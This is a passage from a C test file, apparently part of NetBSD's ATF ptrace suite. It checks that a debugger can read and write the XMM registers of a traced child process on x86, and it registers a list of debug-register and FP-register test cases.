	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[10], &xmm[10], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[11], &xmm[11], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[12], &xmm[12], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[13], &xmm[13], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[14], &xmm[14], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[15], &xmm[15], sizeof(*xmm)));
#endif

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

__attribute__((target("sse")))
static __inline void get_xmm_regs(void* v_xmm)
{
	const struct {
		uint64_t a, b;
	} fill = {0x0F0F0F0F0F0F0F0F, 0x0F0F0F0F0F0F0F0F};

	__asm__ __volatile__(
		/* fill registers with clobber pattern */
		"movaps  %1, %%xmm0\n\t"
		"movaps  %1, %%xmm1\n\t"
		"movaps  %1, %%xmm2\n\t"
		"movaps  %1, %%xmm3\n\t"
		"movaps  %1, %%xmm4\n\t"
		"movaps  %1, %%xmm5\n\t"
		"movaps  %1, %%xmm6\n\t"
		"movaps  %1, %%xmm7\n\t"
#if defined(__x86_64__)
		"movaps  %1, %%xmm8\n\t"
		"movaps  %1, %%xmm9\n\t"
		"movaps  %1, %%xmm10\n\t"
		"movaps  %1, %%xmm11\n\t"
		"movaps  %1, %%xmm12\n\t"
		"movaps  %1, %%xmm13\n\t"
		"movaps  %1, %%xmm14\n\t"
		"movaps  %1, %%xmm15\n\t"
#endif
		"\n\t"
		"int3\n\t"
		"\n\t"
		"movaps  %%xmm0, 0x00(%0)\n\t"
		"movaps  %%xmm1, 0x10(%0)\n\t"
		"movaps  %%xmm2, 0x20(%0)\n\t"
		"movaps  %%xmm3, 0x30(%0)\n\t"
		"movaps  %%xmm4, 0x40(%0)\n\t"
		"movaps  %%xmm5, 0x50(%0)\n\t"
		"movaps  %%xmm6, 0x60(%0)\n\t"
		"movaps  %%xmm7, 0x70(%0)\n\t"
#if defined(__x86_64__)
		"movaps  %%xmm8, 0x80(%0)\n\t"
		"movaps  %%xmm9, 0x90(%0)\n\t"
		"movaps  %%xmm10, 0xA0(%0)\n\t"
		"movaps  %%xmm11, 0xB0(%0)\n\t"
		"movaps  %%xmm12, 0xC0(%0)\n\t"
		"movaps  %%xmm13, 0xD0(%0)\n\t"
		"movaps  %%xmm14, 0xE0(%0)\n\t"
		"movaps  %%xmm15, 0xF0(%0)\n\t"
#endif
		:
		: "a"(v_xmm), "m"(fill)
		: "%xmm0", "%xmm1", "%xmm2", "%xmm3", "%xmm4", "%xmm5", "%xmm6", "%xmm7"
#if defined(__x86_64__)
		, "%xmm8", "%xmm9", "%xmm10", "%xmm11", "%xmm12", "%xmm13", "%xmm14",
		"%xmm15"
#endif
	);
}

ATF_TC(x86_regs_xmm_write);
ATF_TC_HEAD(x86_regs_xmm_write, tc)
{
	atf_tc_set_md_var(tc, "descr",
		"Set xmm0..xmm15 (..xmm7 on i386) reg values into a debugged "
		"program via PT_SETFPREGS (PT_SETXMMREGS on i386) and compare "
		"the result against expected.");
}

ATF_TC_BODY(x86_regs_xmm_write, tc)
{
	const int exitval = 5;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	const int sigval = SIGTRAP;
	int status;
#endif
#if defined(__x86_64__)
	struct fpreg fpr;
#else
	struct xmmregs fpr;
#endif

	const struct {
		uint64_t a, b;
	} xmm[] __aligned(16) = {
		{ 0x0706050403020100, 0x0F0E0D0C0B0A0908, },
		{ 0x0807060504030201, 0x100F0E0D0C0B0A09, },
		{ 0x0908070605040302, 0x11100F0E0D0C0B0A, },
		{ 0x0A09080706050403, 0x1211100F0E0D0C0B, },
		{ 0x0B0A090807060504, 0x131211100F0E0D0C, },
		{ 0x0C0B0A0908070605, 0x14131211100F0E0D, },
		{ 0x0D0C0B0A09080706, 0x1514131211100F0E, },
		{ 0x0E0D0C0B0A090807, 0x161514131211100F, },
#if defined(__x86_64__)
		{ 0x0F0E0D0C0B0A0908, 0x1716151413121110, },
		{ 0x100F0E0D0C0B0A09, 0x1817161514131211, },
		{ 0x11100F0E0D0C0B0A, 0x1918171615141312, },
		{ 0x1211100F0E0D0C0B, 0x1A19181716151413, },
		{ 0x131211100F0E0D0C, 0x1B1A191817161514, },
		{ 0x14131211100F0E0D, 0x1C1B1A1918171615, },
		{ 0x1514131211100F0E, 0x1D1C1B1A19181716, },
		{ 0x161514131211100F, 0x1E1D1C1B1A191817, },
#endif
	};

	/* verify whether SSE is supported here */
	DPRINTF("Before invoking cpuid\n");
	{
		unsigned int eax, ebx, ecx, edx;
		if (!__get_cpuid(1, &eax, &ebx, &ecx, &edx))
			atf_tc_skip("CPUID is not supported by the CPU");

		DPRINTF("cpuid: EDX = %08x\n", edx);

		if (!(edx & bit_SSE))
			atf_tc_skip("SSE is not supported by the CPU");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		struct {
			uint64_t a, b;
		} v_xmm[16] __aligned(16);

		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before running assembly from child\n");
		get_xmm_regs(v_xmm);

		FORKEE_ASSERT(!memcmp(&v_xmm[0], &xmm[0], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[1], &xmm[1], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[2], &xmm[2], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[3], &xmm[3], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[4], &xmm[4], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[5], &xmm[5], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[6], &xmm[6], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[7], &xmm[7], sizeof(*xmm)));
#if defined(__x86_64__)
		FORKEE_ASSERT(!memcmp(&v_xmm[8], &xmm[8], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[9], &xmm[9], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[10], &xmm[10], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[11], &xmm[11], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[12], &xmm[12], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[13], &xmm[13], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[14], &xmm[14], sizeof(*xmm)));
		FORKEE_ASSERT(!memcmp(&v_xmm[15], &xmm[15], sizeof(*xmm)));
#endif

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

#if defined(__x86_64__)
	DPRINTF("Call GETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETFPREGS, child, &fpr, 0) != -1);
#else
	DPRINTF("Call GETXMMREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETXMMREGS, child, &fpr, 0) != -1);
#endif

	memcpy(&fpr.fxstate.fx_xmm[0], &xmm[0], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[1], &xmm[1], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[2], &xmm[2], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[3], &xmm[3], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[4], &xmm[4], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[5], &xmm[5], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[6], &xmm[6], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[7], &xmm[7], sizeof(*xmm));
#if defined(__x86_64__)
	memcpy(&fpr.fxstate.fx_xmm[8], &xmm[8], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[9], &xmm[9], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[10], &xmm[10], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[11], &xmm[11], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[12], &xmm[12], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[13], &xmm[13], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[14], &xmm[14], sizeof(*xmm));
	memcpy(&fpr.fxstate.fx_xmm[15], &xmm[15], sizeof(*xmm));
#endif

#if defined(__x86_64__)
	DPRINTF("Call SETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_SETFPREGS, child, &fpr, 0) != -1);
#else
	DPRINTF("Call SETXMMREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_SETXMMREGS, child, &fpr, 0) != -1);
#endif

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}
/// ----------------------------------------------------------------------------

#define ATF_TP_ADD_TCS_PTRACE_WAIT_X86() \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_print); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr0); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr1); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr2); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr3); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr0_yield); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr1_yield); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr2_yield); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr3_yield); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr0_continued); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr1_continued); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr2_continued); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_preserve_dr3_continued); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_writeonly_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_writeonly_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_writeonly_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_writeonly_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_writeonly_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_writeonly_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_writeonly_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_writeonly_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_writeonly_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_writeonly_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_writeonly_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_writeonly_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_write_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_write_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_write_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_write_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_write_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_write_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_write_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_write_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_write_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_write_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_write_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_write_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_read_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_read_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_read_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_read_byte); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_read_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_read_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_read_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_read_2bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_variable_readwrite_read_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_variable_readwrite_read_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_variable_readwrite_read_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_variable_readwrite_read_4bytes); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_trap_code); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_trap_code); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_trap_code); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_trap_code); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_dont_inherit_lwp); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_dont_inherit_lwp); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_dont_inherit_lwp); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_dont_inherit_lwp); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr0_dont_inherit_execve); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr1_dont_inherit_execve); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr2_dont_inherit_execve); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, dbregs_dr3_dont_inherit_execve); \
	ATF_TP_ADD_TC_HAVE_DBREGS(tp, x86_cve_2018_8897); \
	ATF_TP_ADD_TC_HAVE_FPREGS(tp, x86_regs_mm_read); \
	ATF_TP_ADD_TC_HAVE_FPREGS(tp, x86_regs_mm_write); \
	ATF_TP_ADD_TC_HAVE_FPREGS(tp, x86_regs_xmm_read); \
	ATF_TP_ADD_TC_HAVE_FPREGS(tp, x86_regs_xmm_write);
#else
#define ATF_TP_ADD_TCS_PTRACE_WAIT_X86()
#endif
